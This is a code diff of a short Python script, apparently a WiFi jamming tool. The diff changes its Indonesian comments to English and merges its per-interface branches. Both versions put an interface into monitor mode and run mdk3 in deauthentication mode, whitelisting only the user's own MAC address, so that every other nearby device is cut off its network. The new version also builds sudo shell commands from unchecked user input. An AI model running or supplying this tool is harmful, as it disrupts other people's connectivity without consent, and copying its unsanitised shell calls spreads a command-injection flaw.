@@ -16,62 +16,25 @@
 
 import os
 
-# https://github.com/Anonychun
-
-# memilih interface
-os.system('iwconfig')
-print("1. wlan0")
-print("2. wlp2s0")
-wlan = int(input("\nPilih interface WiFi [1/2]? : "))
+# chose interface
+os.system("iwconfig")
+wlan = input("[+] Select an interface? : ")
 os.system("clear")
 
-if wlan == 1:
-	# menampilkan mac addres
-	print("↓↓ MAC Address ↓↓")
-	os.system("cat /sys/class/net/wlan0/address")
-	print("=================\n")
+# creating whitelist
+file = open("whitelist.txt", "w")
+mac = open("/sys/class/net/{}/address".format(wlan), "r")
+file.write(mac.read())
+mac.close()
+file.close()
+os.system("clear")
 
-	# input mac address
-	mac = input("Masukan MAC Address = ")
-	os.system("clear")
+print("[+] Autodetect MAC Address ...")
+os.system("cat /sys/class/net/{}/address".format(wlan))
+print()
 
-	# proses pembuatan whitelist
-	file = open('whitelist.txt', 'w')
-	file.write(mac)
-	file.close()
-	os.system('clear')
-
-	print("Sedang Melakukan Proses Disconnect WiFi / SSID . . .\n\n")
-
-	# proses membuat adapter type monitor
-	os.system('sudo iw wlan0 interface add mon0 type monitor')
-	# proses disconnect WiFi
-	os.system('sudo mdk3 mon0 d -w whitelist.txt')
-	os.system('clear')
-
-elif wlan == 2:
-	# menampilkan mac addres
-	print("↓↓ MAC Address ↓↓")
-	os.system("cat /sys/class/net/wlp2s0/address")
-	print("=================\n")
-
-	# input mac address
-	mac = input("Masukan MAC Address = ")
-	os.system("clear")
-
-	# proses pembuatan whitelist
-	file = open('whitelist.txt', 'w')
-	file.write(mac)
-	file.close()
-	os.system('clear')
-
-	print("Sedang Melakukan Proses Disconnect WiFi / SSID . . .\n")
-
-	# proses membuat adapter type monitor
-	os.system('sudo iw wlp2s0 interface add mon0 type monitor')
-	# proses disconnect WiFi
-	os.system('sudo mdk3 mon0 d -w whitelist.txt')
-	os.system('clear')
-
-else:
-	print("Input yang anda masukan salah")
+# making an adapter type monitor
+os.system("sudo iw {} interface add mon0 type monitor".format(wlan))
+# disconnecting WiFi
+os.system("sudo mdk3 mon0 d -w whitelist.txt")
+os.system("clear")
